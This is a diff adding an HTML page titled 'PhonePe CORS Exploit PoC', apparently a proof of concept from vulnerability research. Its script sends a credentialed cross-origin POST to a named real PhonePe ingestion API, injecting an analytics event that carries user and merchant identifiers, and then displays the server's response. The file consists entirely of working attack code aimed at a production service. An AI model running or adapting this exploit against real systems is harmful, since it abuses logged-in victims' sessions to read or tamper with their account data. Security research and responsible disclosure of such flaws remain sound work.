@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhonePe CORS PoC</title>
+</head>
+<body>
+    <h2>PhonePe CORS Exploit PoC</h2>
+    <button onclick="exploit()">Exploit</button>
+    <pre id="output"></pre>
+
+    <script>
+        function exploit() {
+            fetch("https://api.phonepe.com/apis/unified-ingestion/v5/bulk/ingest", {
+                method: "POST",
+                credentials: "include",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify([
+                    {
+                        "meta": {
+                            "schemaName": "STREAMS_EVENT",
+                            "sensitivity": "LOW",
+                            "source": "WEB",
+                            "batchId": "9016c06e-51ba-40d2-8e1a-67d8c277a0f1"
+                        },
+                        "dataPoints": [
+                            {
+                                "data": {
+                                    "app": "pb_web_analytics",
+                                    "eventType": "apiError",
+                                    "groupingKey": "7f167fd3-5774-4a83-849f-8ed9f0c22c03",
+                                    "farmId": "nm5",
+                                    "eventSchemaVersion": "v1",
+                                    "eventTTLBucket": "MEDIUM",
+                                    "eventData": {
+                                        "name": "API_ERROR",
+                                        "value": "NA",
+                                        "userId": "OU2310260654335100000102",
+                                        "merchantId": "M4NMYETI3",
+                                        "merchantUserId": "MU2112281738214808787209",
+                                        "merchantType": "OFFLINE_MERCHANT",
+                                        "pageName": "DASHBOARD_PAGE"
+                                    }
+                                },
+                                "id": "7f167fd3-5774-4a83-849f-8ed9f0c22c03"
+                            }
+                        ]
+                    }
+                ])
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById("output").innerText = data;
+            })
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
